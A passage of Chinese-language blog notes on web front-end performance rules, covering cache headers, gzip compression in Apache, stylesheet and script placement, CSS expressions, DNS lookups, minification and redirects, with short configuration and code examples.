<p>Cache-Control使用max-age指令指定组件被缓存多久。它以秒为单位定义了一个更新窗。如果从组件被请求开始过去的秒数少于max-age，浏览器就使用缓存的版本，这就避免了额外的Http请求。一个长久的max-age头将刷新窗设置为未来10年。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cache-Control: max-age=315360000</span><br></pre></td></tr></table></figure></p>
<p>使用带有max-age的Cache-Control可以消除Expires的限制，你可以同时指定这两个响应头——Expires和Cache-Control max-age。如果两者同时出现，HTTP规范规定max-age指令将重写Expires头。</p>
<p>对于Expires带来的时钟同步和配置维护问题，mod_expires Apache模块使你在使用Expires头时能够像max-age那样以相对的方式设置日期。<br>下例中，过期时间被设计为自请求开始的10年之后：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> "\<span class="attr">.</span>(<span class="attr">gif</span>|<span class="attr">jpg</span>|<span class="attr">js</span>|<span class="attr">css</span>)$"&gt;</span></span><br><span class="line">ExpiresDefault "access plus 10 years"</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>它同时向相应中发送Expires头和Cache-Control max-age头。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Expires: Sun, 16 Oct 2016 05:43:02 GMT</span><br><span class="line">Cache-Control: max-age=315360000</span><br></pre></td></tr></table></figure></p>
<p>由于Cache-Control具有优先权，同时在HTTP1.0浏览器Expires生效。</p>
<h2 id="不仅仅是图片"><a href="#不仅仅是图片" class="headerlink" title="不仅仅是图片"></a>不仅仅是图片</h2><p>长久的Expires头应该包含任何不经常变化的组件，包括脚本、样式表和Flash组件。</p>
<h2 id="修订文件名"><a href="#修订文件名" class="headerlink" title="修订文件名"></a>修订文件名</h2><p>如果我们将组件配置为可以由浏览器代理缓存，当这些组件改变时用户如何获得更新呢？当出现了Expires头时，直到过期为止一直会使用缓存的版本。</p>
<p>最有效的解决方案是修改其所有链接，这样，全新的请求将从原始服务器下载最新的内容。通常将版本号嵌在组件的文件名中。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果没有长久的Expires头，它仍然会存储在浏览器的缓存中。在后续请求中，浏览器会检查缓存并发现组件已经过期。为了提高效率，浏览器会发送一个GET请求。如果组件没有改变，原始服务器可以免于发送整个组件，而是发送一个很小的头，告诉浏览器可以使用其缓存的组件。</p>
<p>这些条件请求加起来，就是缓存节省的时间。</p>
<h1 id="规则4——压缩组件"><a href="#规则4——压缩组件" class="headerlink" title="规则4——压缩组件"></a>规则4——压缩组件</h1><p>如果HTTP请求产生的响应包很小，传输时间就会减少，因为只需要将很小的包从服务器传递到客户端。</p>
<p>从HTTP1.1开始，Web客户端可以通过HTTP请求中的Accept-Encoding头来标识对压缩的支持。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure></p>
<p>如果Web服务器看到请求中有这个头，就会使用客户端列出的方法中的一种来压缩响应。Web服务器通过响应中的Content-Encoding头来通知Web客户端。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br></pre></td></tr></table></figure></p>
<p>gzip是目前最流行和最有效的压缩方法。支持deflate的浏览器也支持gzip，但很多浏览器支持gzip却不支持deflate。</p>
<h2 id="压缩什么"><a href="#压缩什么" class="headerlink" title="压缩什么"></a>压缩什么</h2><p>压缩的内容包括XML和JSON在内的任何文本响应，但这里只关注脚本和样式表，因为他们用得最普遍。图片和PDF不应该被压缩，因为它们本来就已经被压缩了，会浪费CPU资源，还可能增加文件的大小。</p>
<p>服务器会花费额外的CPU周期来完成压缩，客户端要对压缩文件进行解压缩。要检测收益是否大于开销，需要考虑响应的大小、连接的带宽和客户端与服务器之间的Internet距离。这些信息难以得到且也有其他变数需要考虑。根据经验通常对1KB或者2KB以上的文件进行压缩。mod_gzip_minimum_file_size指令控制着希望压缩的文件的最小值。</p>
<h2 id="节省"><a href="#节省" class="headerlink" title="节省"></a>节省</h2><p>gzip是典型的压缩选择。gzip能将响应整体减少66%，而deflate能减少60%。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>Apache1.3使用mod_gzip,以下是最常用的指令：<br>启用mod_gzip<br>mod_gzip_on<br>基于文件类型、MIME类型、用户代理等定义哪些需要压缩、哪些不需要。<br>mod_gzip_item_include<br>mod_gzip_item_exclude<br>例如明确压缩脚本和样式表：<br>mod_gzip_item_include file .js$<br>mod_gzip_item_include mime ^application/x-javascript$<br>mod_gzip_item_include file .css$<br>mod_gzip_item_include mime ^text/css$</p>
<p>gzip命令行工具提供了一个选项，用于控制压缩的程度，可以在CPU使用量和数据大小的变化之间进行取舍，但mod_gzip中没有配置指令能够控制压缩级别。如果流式压缩产生的CPU负载成问题，可以考虑在磁盘或内存中缓存经过压缩的组件。mod_gzip提供了选项，可以将保存压缩过的内容自动保存在磁盘上，并在原内容发生变化时更新压缩过的内容。使用mod_gzip_can_negotiate和mod_gzip_update_static指令可以完成这一任务。</p>
<p>Apache2.x使用mod_deflate模块。对压缩脚本和样式表的基本配置：<br>AddOutputFilterByType DEFLATE text/html text/css application/x-javascript</p>
<p>和mod_gzip不同，mod_deflate包含了一个用于控制压缩级别的指令——DeflateCompressionLevel。</p>
<h2 id="代理缓存"><a href="#代理缓存" class="headerlink" title="代理缓存"></a>代理缓存</h2><p>当浏览器通过代理来发送请求时，情况就变得复杂了。假设某url发送到代理的第一个请求来自于一个不支持gzip的浏览器。这是到达代理的第一个请求，因此缓存为空。代理会将请求转发到web服务器。此时服务器的响应是未经过压缩的。这个没有压缩的响应被代理缓存起来并发送给浏览器。假设到达代理的第二个请求是来自同一个url，来自于一个支持gzip的浏览器。代理会使用缓存中（未经压缩）的内容进行响应，这就失去了进行压缩的机会。如果顺序反了，情况可能更加严重。</p>
<p>解决的方法是在web服务器的响应中添加Vary头，告诉代理根据一个或多个请求头来改变缓存的响应。因此需要在服务器的Vary响应头中包含Accept-Encoding.<br>Vary: Accept-Encoding<br>默认情况下，mod_gzip会向所有响应添加Vary: Accept-Encoding头。</p>
<h2 id="浏览器边缘情形"><a href="#浏览器边缘情形" class="headerlink" title="浏览器边缘情形"></a>浏览器边缘情形</h2><p>不是所有浏览器都完美支持压缩</p>
<p>在Apache1.3可以通过在mod_gzip_item_include中使用恰当的User-Agent值来指定浏览器白名单：<br>mod_gzip_item_include reqheader “User-Agent: MSIE [6-9]”<br>mod_gzip_item_include reqheader “User-Agent: Mozilla/[5-9]”</p>
<p>在Apache2.x使用BrowserMatch指令<br>BrowserMatch ^MSIE [6-9] gzip<br>BrowserMatch ^Mozilla/[5-9] gzip</p>
<p>将代理缓存加进来，把User-Agent作为代理的另外一种评判标准添加到Vary头中。<br>Vary: Accept-Encoding,User-Agent<br>mod_gzip检测到你在使用浏览器白名单时，会自动将User-Agent字段添加到Vary头中，不幸的是，由于User-Agent有上千种值，代理不太可能为其所代理的所有url缓存Accept-Encoding和User-Agent的所有组合。甚至这样可能会导致完全禁用为响应包进行的缓存。另外一种方法是使用Vary: <em>或Cache-Control: private头来禁用代理缓存。因为Vary: </em>头防止了浏览器使用缓存的组件，不过最好使用Cache-Control: private，Google和Yahoo都使用了这种方式。</p>
<p>如何平衡压缩和代理支持的决定是很复杂的，需要在加快响应时间、减小带宽开销和边缘情形浏览器缺陷之间进行权衡。</p>
<h1 id="规则5——将样式表放在顶部"><a href="#规则5——将样式表放在顶部" class="headerlink" title="规则5——将样式表放在顶部"></a>规则5——将样式表放在顶部</h1><p>我们发现将DHTML特征的样式表放在文档顶部——head中——能使页面加载得更快。</p>
<h2 id="逐步呈现"><a href="#逐步呈现" class="headerlink" title="逐步呈现"></a>逐步呈现</h2><p>关心性能的前端工程师都希望页面能逐步地加载，为用户提供可视化的反馈是很重要的。</p>
<p>将样式表放在文档底部，浏览器为避免当样式变化时重绘页面中的元素，浏览器会阻塞内容逐步呈现。浏览器延迟显示任何可视化组件，就会出现“白屏“。</p>
<h2 id="将CSS放在底部"><a href="#将CSS放在底部" class="headerlink" title="将CSS放在底部"></a>将CSS放在底部</h2><p>在Internet Explorer中，将样式表放在文档底部会导致白屏的问题情形如下：<br>1.在新窗口中打开时<br>2.单击刷新按钮，在页面加载时最小化然后恢复窗口就能看到白屏。<br>3.设置为主页打开新的浏览器窗口时</p>
<h2 id="将CSS放在顶部"><a href="#将CSS放在顶部" class="headerlink" title="将CSS放在顶部"></a>将CSS放在顶部</h2><p>若将样式表放在文档顶部的HEAD中，页面都是逐步呈现的</p>
<p>关于Link标签和@import规则<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"styles1.css"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="keyword">@import</span> url(<span class="string">"styles2.css"</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>一个style块可以包含多个@import规则，但必须放在所以其他规则之前。同时@import规则有可能会导致白屏，即使是放在HEAD标签中。使用@import有时会导致组件下载的无序性。</p>
<h2 id="无样式内容的闪烁"><a href="#无样式内容的闪烁" class="headerlink" title="无样式内容的闪烁"></a>无样式内容的闪烁</h2><p>白屏现象源自于浏览器的行为。如果样式表仍在加载，构建呈现树就是一种浪费，因为在所有样式表加载并解析完毕之前显示内容会遇到FOUC(无样式内容的闪烁，Flash of Unstyled Content)问题</p>
<p>白屏是对FOUC问题的弥补。</p>
<p>IE在前面介绍的情形中会选择白屏，在单击链接、使用书签或键入URL会选择第二种方式——承担FOUC风险。</p>
<h1 id="规则6——将脚本放在底部"><a href="#规则6——将脚本放在底部" class="headerlink" title="规则6——将脚本放在底部"></a>规则6——将脚本放在底部</h1><h2 id="脚本带来的问题"><a href="#脚本带来的问题" class="headerlink" title="脚本带来的问题"></a>脚本带来的问题</h2><p>脚本会阻塞并行下载。</p>
<h2 id="并行下载"><a href="#并行下载" class="headerlink" title="并行下载"></a>并行下载</h2><p>HTTP1.1规范，建议浏览器从每个主机名并行下载两个组件。当然这个在浏览器上是可以重新配置的。使用CNAME（DNS别名）可以将组件放在多个主机中。增加并行下载并非没有开销，取决于带宽、CPU速度，过多的并行下载反而会降低性能。</p>
<h2 id="脚本阻塞下载"><a href="#脚本阻塞下载" class="headerlink" title="脚本阻塞下载"></a>脚本阻塞下载</h2><p>在下载脚本时并行下载实际是被禁用的，其中一个原因是脚本可能会使用document.write来修改页面内容，因此浏览器会等待，以确保页面能够恰当的布局。</p>
<p>另一个重要的原因是保证脚本能够按照正确的顺序执行。</p>
<h2 id="最差情况：将脚本放在顶部"><a href="#最差情况：将脚本放在顶部" class="headerlink" title="最差情况：将脚本放在顶部"></a>最差情况：将脚本放在顶部</h2><p>影响：</p>
<ol>
<li>脚本会阻塞对其后面内容的呈现</li>
<li>脚本会阻塞对其后面组件的下载</li>
</ol>
<h2 id="正确地放置"><a href="#正确地放置" class="headerlink" title="正确地放置"></a>正确地放置</h2><p>在很多情况下，很难将脚本移到底部。例如，如果脚本使用document.write向页面中插入了内容，就不能将其移动到页面中靠后的位置。此外还会有作用域问题。很多情况下，可以用其他方法解决这些情形。</p>
<p>经常出行的另外一种建议是使用Defferred脚本。DEFER属性表明脚本不包含document.write,浏览器得到这一线索可以继续呈现。但是在firefox中即使是延迟脚本也会产生阻塞。如果一个脚本可以延迟，那么它一定可以移到页面底部，这是最佳方式。</p>
<h1 id="避免CSS表达式"><a href="#避免CSS表达式" class="headerlink" title="避免CSS表达式"></a>避免CSS表达式</h1><p>使用CSS表达式将背景色设置为每小时变化一次：<br><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">backgroud-color</span>: expression( (new Date()).getHours() % <span class="number">2</span> ? <span class="string">"#FFF"</span> : <span class="string">"#000"</span> );</span><br></pre></td></tr></table></figure></p>
<p>对于低版本IE不支持min-width,可以识别表达式，而其他浏览器识别静态配置：<br><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">width</span>: expression( document.body.clientWidth &lt; <span class="number">600</span> ? <span class="string">"600px"</span> : <span class="string">"auto"</span> );</span><br><span class="line"><span class="attribute">min-width</span>: <span class="number">600px</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="更新表达式"><a href="#更新表达式" class="headerlink" title="更新表达式"></a>更新表达式</h2><p>表达式的问题在于对其进行的求值的频率比人们期望的要高。它们不只是页面呈现和大小改变时求值，当页面滚动、甚至用户鼠标在页面上移过时都要求值。</p>
<h2 id="围绕问题展开工作"><a href="#围绕问题展开工作" class="headerlink" title="围绕问题展开工作"></a>围绕问题展开工作</h2><p>用两种技术可以避免css表达式产生这一问题——创建一次性表达式和使用事件处理器取代css表达式。</p>
<h2 id="一次性表达式"><a href="#一次性表达式" class="headerlink" title="一次性表达式"></a>一次性表达式</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">p &#123;</span><br><span class="line">    background-color: expression( altBgcolor(this) );</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">altBgcolor</span>(<span class="params">elem</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    elem.style.backgroundColor = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getHours() % <span class="number">2</span> ? <span class="string">"#F08A00"</span> : <span class="string">"#B8D4FF"</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>css表达式调用了altBgcolor()函数，而该函数将样式的backgroud-color属性设置为一个明确的值，并移除了CSS表达式。</p>
<h2 id="事件处理器"><a href="#事件处理器" class="headerlink" title="事件处理器"></a>事件处理器</h2><p>当浏览器的大小改变时，这个例子使用setMinWidth()函数来修改所有段落元素的大小<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setMinWidth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> aElements = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"p"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; aElements.length; i ++) &#123;</span><br><span class="line">        aElements[i].runtimeStyle.width = ( <span class="built_in">document</span>.body.clientWidth &lt; <span class="number">600</span> ? <span class="string">"600px"</span> : <span class="string">"auto"</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> != navigator.userAgent.indexOf(<span class="string">"MSIE"</span>)) &#123;</span><br><span class="line">    <span class="built_in">window</span>.onresize = setMinWidth;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>但这在第一次呈现时并不能恰当的设置段落的大小，所以需要使用”一次性表达式“介绍得方法设置初始宽度。</p>
<h1 id="规则8——使用外部javascript和css"><a href="#规则8——使用外部javascript和css" class="headerlink" title="规则8——使用外部javascript和css"></a>规则8——使用外部javascript和css</h1><h2 id="内联vs外置"><a href="#内联vs外置" class="headerlink" title="内联vs外置"></a>内联vs外置</h2><p>纯粹而言，内联快一些，这主要是因为外部示例需要承担多个HTTP请求带来的开销。</p>
<p>但是JavaScript和css文件外置有机会被浏览器缓存起来。</p>
<p>如果你的网站的本质上能够为用户带来高完整缓存率，使用外部文件的收益就更大。如果不太可能产生完整缓存，则内联是更好的选择。</p>
<h2 id="组件重用"><a href="#组件重用" class="headerlink" title="组件重用"></a>组件重用</h2><p>如果你的网站中每个页面都使用了相同的javascript和css,使用外部文件可以提高这些组件的重用率。在这种情况下使用外部文件更加具有优势，因为当用户在页面间导航时，javascript和css组件已经位于浏览器的缓存中了。</p>
<p>在典型情况下，页面之间javascript和css的重用既不可能100%重叠，也不可能100%无关。</p>
<p>最好的答案就是折中，将你的页面划分成几种页面类型，然后为每种类型创建单独的脚本和样式表。这比维护一个单独的文件要复杂，但通常比为每个页面维护不同的脚本和样式表要容易，并且对于给定的任意页面都只需要下载很少的多余的javascript和css。</p>
<h2 id="主页"><a href="#主页" class="headerlink" title="主页"></a>主页</h2><p>我所见过的使用内联方式反而更好的一个例外是主页。</p>
<p>页面查看</p>
<p>主页拥有没有很高的页面查看数量，然而，通常每个会话只有一个页面查看。</p>
<p>空缓存vs完整缓存</p>
<p>完整缓存的百分比要比其他网站更低。出于安全的原因，很多用户选择在每次关闭浏览器时清空缓存。下一次用户打开浏览器时，产生的是一个主页的空缓存页面查看。</p>
<p>组件重用</p>
<p>重用率很低，很多主页是用户来到网站后访问的唯一一个页面，因此它们谈不上重用。</p>
<p>分析了这些基准，我们更加倾向于适用内联，当然，没有适用于所有主页的唯一答案。</p>
<h2 id="两全其美"><a href="#两全其美" class="headerlink" title="两全其美"></a>两全其美</h2><p>这里介绍得两项技术使你既可以获得内联的优势，同时也能缓存外部文件。</p>
<h2 id="加载后下载"><a href="#加载后下载" class="headerlink" title="加载后下载"></a>加载后下载</h2><p>对于作为多次页面查看中的第一次的主页，我们希望为主页内联javascript和css，但又能为所有后续页面查看提供外部文件。这可以通过在主页加载完成后动态下载外部组件来实现（通过onload事件）。这能够将外部文件放到浏览器的缓存中以便用户接下来访问其他页面。</p>
<p>这些页面中javascript和css被加载到页面中两次（先是内联的，然后是外部的）。要使其能够工作，必须处理双重定义。例如脚本，可以定义但不能执行函数（至少不能让用户察觉）。使用了相对单位（百分比或em）的css如果指定两次可能会产生问题。将这些组件放到一个不可见的IFrame中是一种更好的方式。</p>
<h2 id="动态内联"><a href="#动态内联" class="headerlink" title="动态内联"></a>动态内联</h2><p>这可以通过使用前一个例子中的加载后下载技术来完成。当用户第一次访问页面时，服务器发现没有cookie,于是生成一个内联了组件的页面。然后服务器添加javascript来在页面加载后动态下载外部文件(并设置cookie)。下一次访问页面时，服务器看到了cookie，就会生成一个使用外部文件的页面。</p>
<p>这种方式的美好之处在于它的宽容。即便cookie的状态和缓存的状态不匹配，页面也能够工作，只是没有本应该的那么优化而已。</p>
<h1 id="减少DNS查找"><a href="#减少DNS查找" class="headerlink" title="减少DNS查找"></a>减少DNS查找</h1><p>DNS将主机名映射到IP地址上，在DNS查找的响应时间依赖于DNS解析器（通常由你的ISP提供），它所承担的请求压力、你与它之前的距离和你的带宽速度。</p>
<h2 id="DNS缓存和TTL"><a href="#DNS缓存和TTL" class="headerlink" title="DNS缓存和TTL"></a>DNS缓存和TTL</h2><p>DNS查找可以被缓存起来以提高性能。这种缓存可以发生在由你的ISP或者局域网中的一台特殊的缓存服务器上，但我们这里要探索的是发生在独立用户的计算机上的DNS缓存。<br>例如，在用户请求了一个主机名之后，DNS信息会留在操作系统的DNS缓存中，之后对于该主机名的请求将无需进行过多的DNS查找，至少短时间内不需要。<br><img src="https://mfaying.github.io/static/images/高性能网站建设指南/8.jpg" alt="avatar"></p>
<p>很多浏览器拥有其自己的缓存，和操作系统的缓存相分离。只要浏览器在其缓存中保留了DNS记录，它就不会麻烦操作系统来请求这个记录。只有当浏览器缓存丢失了记录时，它才会向操作系统询问地址——然后操作系统或者通过其缓存来响应这个请求，或者将请求发送给一台远程服务器，这时就会发生潜在的速度降低。</p>
<p>设计者知道IP地址会变化以及缓存会消耗内存。因此，应该周期性地清除缓存中的DNS记录，并通过大量不同的配置设置检测清除的频率有多高。</p>
<h2 id="影响DNS缓存的因素"><a href="#影响DNS缓存的因素" class="headerlink" title="影响DNS缓存的因素"></a>影响DNS缓存的因素</h2><p>服务器可以表明记录可以被缓存多久。查找返回的DNS记录包含了一个存活时间（Time-to-live,TTL）值。该值告诉客户端可以对该记录缓存多久。</p>
<p>尽管操作系统缓存会考虑TTL值，但浏览器通常忽略该值，并设置它自己的时间限制。此外Keep-Alive特性可以同时覆盖TTL和浏览器的时间限制。只要浏览器和web服务器通信着，并保持TCP连接打开的状态，就没有理由进行DNS查找。</p>
<p>浏览器对缓存的DNS记录的数量也有限制，而不管缓存记录的时间，访问较多的域名，较早的DNS记录将被丢弃。不过操作系统可能依然保留着该记录，这能扭转一下局面。</p>
<h2 id="TTL值"><a href="#TTL值" class="headerlink" title="TTL值"></a>TTL值</h2><p>不同网站的TTL值差距很大，许多网站都在努力做到当服务器、虚拟IP地址（VIP）或联合定位掉线时提供快速故障转移。这也是提供较多TTL的原因。MySpace定位到一个联合定位工具，对于其当前的网络拓扑，故障转移并不是很重要，因此他们选择了较长的TTL。</p>
<p>客户端收到的DNS记录的平均TTL值只有最大TTL值的一半。这是因为DNS解析器自身也拥有与DNS记录相关的TTL。当浏览器进行DNS查找时，DNS解析器返回的时间是其记录的TTL的剩余时间。如果最大TTL是5分钟，DNS解析器返回的TTL范围可能是1~300秒。</p>
<h2 id="浏览器视角"><a href="#浏览器视角" class="headerlink" title="浏览器视角"></a>浏览器视角</h2><p>Microsoft Windows上的DNS缓存由DNS Client服务进行管理。你可以使用ipconfig命令来查看和刷新DNS Client服务。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig /displaydns</span><br><span class="line">ipconfig /flushdns</span><br></pre></td></tr></table></figure></p>
<p>重新启动也可以清空DNS Client服务缓存。重新启动浏览器会清空浏览器缓存，但不会清空DNS Client服务缓存。</p>
<p>IE</p>
<p>IE的DNS缓存由三个注册表设置控制</p>
<p>部分设置的默认值值如下：<br>DnsCacheTimeout——30分钟<br>KeepAliveTimeout–1分钟<br>ServerInfoTimeout–2分钟</p>
<p>如果DNS服务器TTL值小于30分钟的话，对浏览器进行DNS查找的频率产生的影响很小。一旦浏览器缓存了DNS记录，就会使用30分钟作为TTL值。如果发生了错误，刷新DNS查找就会比这要快，在正常情况下，很短的TTL值（30min以下）在IE中不会增加DNS查找的数量。</p>
<p>Keep-Alive,一个持久的TCP连接将会一直使用，直到其空闲1分钟为止。由于连接是持久的，因此无需DNS查找。</p>
<p>ServerInfoTimeout的值为2分钟，说明尽管没有Keep-Alive，如果一个主机名每两分钟重用了一次，并且没有发生错误，也无需尽心DNS查找。</p>
<p>当网络操作中心尝试通过DNS变化来转移流量时，如果一个IP上的流量已经被转移走，但该IP仍在运行，则使用旧的DNS记录的IE用户至少需要30分钟才能更新DNS。至少每两分钟访问一次的活跃用户会一直使用旧的IP，直到发生错误。</p>
<h2 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h2><p>具有下列配置设置</p>
<p>1.network.dnsCacheExpiration-1分钟<br>2.network.dnsCacheEntries-20<br>3.network.http.keep-alive.timeout-5分钟</p>
<h2 id="减少DNS查找-1"><a href="#减少DNS查找-1" class="headerlink" title="减少DNS查找"></a>减少DNS查找</h2><p>当客户端的DNS缓存为空(浏览器和操作系统都是)时，DNS查找的数量与web页面中唯一主机名的数量相等。减少唯一主机名的数量就可以减少DNS查找的数量。</p>
<p>减少唯一主机名的数量会潜在地减少页面中并行下载的数量。</p>
<p>我的建议是将组件分别放到至少2个，但不要超过4个主机名下。</p>
<p>另外，确保服务器支持Keep-Alive还能减少DNS查找。</p>
<h1 id="规则10——精简javascript"><a href="#规则10——精简javascript" class="headerlink" title="规则10——精简javascript"></a>规则10——精简javascript</h1><h2 id="精简"><a href="#精简" class="headerlink" title="精简"></a>精简</h2><p>精简是从代码中移除不必要的字符以减少其大小，进而改善加载时间的实践。在代码被精简后，所有的注释以及不必要的空白字符（空格、换行和制表符）都将被移除。</p>
<p>这里，我需要谈一下另外一种更具挑战性的精简方式——混淆。</p>
<h2 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h2><p>混淆和精简一样，它也会移除注释和空白，同时它还会改写代码。作为改写的一部分，函数和变量的名字将被转换为更短的字符串，这时的代码更加精炼，也更加难以阅读。通常这样做是为了增加对代码进行反向工程的难度，但这对提高性能也有帮助，因为这比精简更能减小代码的大小。</p>
<p>精简是一个安全并且相当简单的过程，而混淆则更为复杂一些。混淆有三个主要的缺点——</p>
<p>缺陷 混淆过程本身很有可能引入错误<br>维护 由于混淆会改变javascript符号，因此需要对任何不能改变的符号（例如API函数）进行标记，防止混淆器修改它们。<br>调试 经过混淆的代码很难阅读。这使得在产品环境中调试问题更加困难。</p>
<p>我的建议是使用精简而不是混淆。最终的决定需要考虑混淆能够带来的额外的代码大小减少量。</p>
<h2 id="节省-1"><a href="#节省-1" class="headerlink" title="节省"></a>节省</h2><p>这里使用JSMin和Dojo Compressor（已改名ShrinkSafe）精简javascript代码。</p>
<p>我们精简来自YUI库的event.js。</p>
<p>经过JSMin的处理后，所有不必要的空白将被移除</p>
<p>Dojo Compressor移除了大部分的空白，同时还缩短了变量名。</p>
<p>混淆相比精简可以进一步减小代码尺寸，结合了gzip压缩后，之间的差别将会减小。</p>
<h2 id="锦上添花"><a href="#锦上添花" class="headerlink" title="锦上添花"></a>锦上添花</h2><p>内联脚本也可以精简</p>
<h2 id="精简css"><a href="#精简css" class="headerlink" title="精简css"></a>精简css</h2><p>精简css能够带来的节省通常要小于精简javascript，因为通常css中的注释和空白比javsscript少。最大的潜在节省来自于优化css-合并相同的类、移除不使用的类等。css的依赖顺序的本质决定了这将是一个复杂的问题。这个领域还需要进一步研究和工具开发。最佳的解决方案还是移除注释和空白，并进行一些直观的优化，比如使用缩写（”#606”代替”#660066”）和移除不必要的字符串（”0”代替”0px”）</p>
<h1 id="规则11——避免重定向"><a href="#规则11——避免重定向" class="headerlink" title="规则11——避免重定向"></a>规则11——避免重定向</h1><p>重定向用于将用户从一个URL重新路由到另一个URL。重定向有很多种——301和302是最常用的两种。重定向可能有很多不同的原因，包括网站重新设计、跟踪流量、记录广告点击和建立易于记忆的URL。</p>
<h2 id="重定向的类型"><a href="#重定向的类型" class="headerlink" title="重定向的类型"></a>重定向的类型</h2><p>当web服务器向浏览器返回一个重定向时，响应中就会拥有一个范围在3xx的状态码。这表示用户代理必须执行进一步操作才能完成请求。<br>300 Multiple Choices(基于Content-Type)<br>301 Moved Permancently<br>302 Moved Temporarily(亦称Found)<br>303 See Other(对302的说明)<br>304 Not Modified<br>305 Use Proxy<br>306 (已废弃)<br>307 Temporary Redirect (对302的说明)</p>
<p>“304 Not Modified”并不真的是重定向——它用来响应条件GET请求，避免下载已经存在于流量器缓存中的数据</p>
<p>301和302是使用得最多的。状态码303和307是在http1.1规范中添加的，用来澄清对302的使用（滥用），但是几乎没有人用303和307，绝大多数网站仍然在沿用302.</p>
<p>下面是一个301响应头的一个示例<br><img src="https://mfaying.github.io/static/images/高性能网站建设指南/9.jpg" alt="avatar"><br>浏览器会自动将用户带到Location字段所给出的URL。重定向所必需的所有信息都出现在这个头中了。响应体通常是空的。不管叫什么名字，301和302响应在实际中都不会被缓存，除非有附加的头——如Expires或Cache-Control等——要求它这么做。</p>
<p>还有其他方法可以自动将用户重定向到其他URL。HTML文档的头中包含的meta refresh标签可以在其content属性所指定的秒数之后重定向用户<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0; url=http://strbesouders.com/newuri"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>javascript也可以用于执行重定向，将document.location设置为期望的url即可。如果你必须进行重定向，最好的技术是使用标准的3xx HTTP状态码，这主要是为了确保后退按钮能够正确工作。</p>
<h2 id="重定向之外的其他选择"><a href="#重定向之外的其他选择" class="headerlink" title="重定向之外的其他选择"></a>重定向之外的其他选择</h2><h2 id="缺少结尾的斜线"><a href="#缺少结尾的斜线" class="headerlink" title="缺少结尾的斜线"></a>缺少结尾的斜线</h2><p>很多web开发人员没有意识到，在url的结尾必须出现斜线（/）而没出现时，如<a href="http://astrology.yahoo.com/astrology会导致一个301响应" target="_blank" rel="noopener">http://astrology.yahoo.com/astrology会导致一个301响应</a>, 包含了一个到<a href="http://astrology.yahoo.com/astrology" target="_blank" rel="noopener">http://astrology.yahoo.com/astrology</a> 的重定向。当缺少结尾的斜线时发送重定向有着很充分的理由——它允许自动索引（autoindexing,自动转到默认的index.html上）并且能够获得与当前目录相关的url(如logo.gif)。然而，很多流行的web页面并不依赖自动索引，而是依赖特定的url和处理器。另外，url通常也与根目录相关而不是和当前目录相关。</p>
<p>注意当主机名后缺少结尾斜线时不会发生重定向。例如，<a href="http://www.yahoo.com" target="_blank" rel="noopener">http://www.yahoo.com</a> 不会产生重定向。然而，你在浏览器中看到的最终的url是包含结尾斜线的——<a href="http://www.yahoo.com/" target="_blank" rel="noopener">http://www.yahoo.com/</a> .导致自动产生结尾斜线的原因是，浏览器在运行get请求时必需指定一些路径。如果没有路径，例如<a href="http://www.yahoo.com" target="_blank" rel="noopener">http://www.yahoo.com</a> 它就会简单地使用文档根（/）<br>GET / HTTP 1.1<br>当缺少结尾斜线时发送重定向是很多web服务器的默认行为，包括Apache. Alias指令是一种简单的方法。另一种选择是使用mod_rewrite模块，但Alias更加简单。（注1）Astrology网站的问题可以通过向Apache配置中添加下列内容来解决——<br>Alias /astrology /user/local/apache/htdocs/astrology/astrology.html</p>
